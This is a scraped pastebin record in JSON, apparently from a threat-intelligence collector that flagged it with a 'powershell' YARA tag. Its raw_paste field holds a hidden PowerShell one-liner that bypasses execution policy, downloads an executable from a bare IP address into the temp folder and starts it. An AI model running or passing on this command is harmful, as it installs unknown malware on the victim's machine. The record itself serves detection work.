{
    "scrape_url": "https://scrape.pastebin.com/api_scrape_item.php?i=AR7S0xTZ",
    "full_url": "https://pastebin.com/AR7S0xTZ",
    "date": "1594305528",
    "key": "AR7S0xTZ",
    "size": 196,
    "expire": "0",
    "title": "drago",
    "syntax": "bash",
    "user": "",
    "filename": "AR7S0xTZ",
    "pasteid": "AR7S0xTZ",
    "pastesite": "pastebin.com",
    "@timestamp": "2020-07-09T14:38:48",
    "MD5": "593027353cc56fdaca027c865fe5ad32",
    "SHA256": "0f64a87888ae801ffe95179a2273de55ef6a43d3a311520eb7a52663d49ea54e",
    "raw_paste": "start powershell -NoP -NonI -W Hidden -Exec Bypass \"IEX (New-Object System.Net.WebClient).DownloadFile('http://5.196.33.199/serv.exe',\\\"$env:temp\\serv.exe\\\"); Start-Process \\\"$env:temp\\serv.exe\\\"\"",
    "YaraRule": [
        "powershell"
    ]
}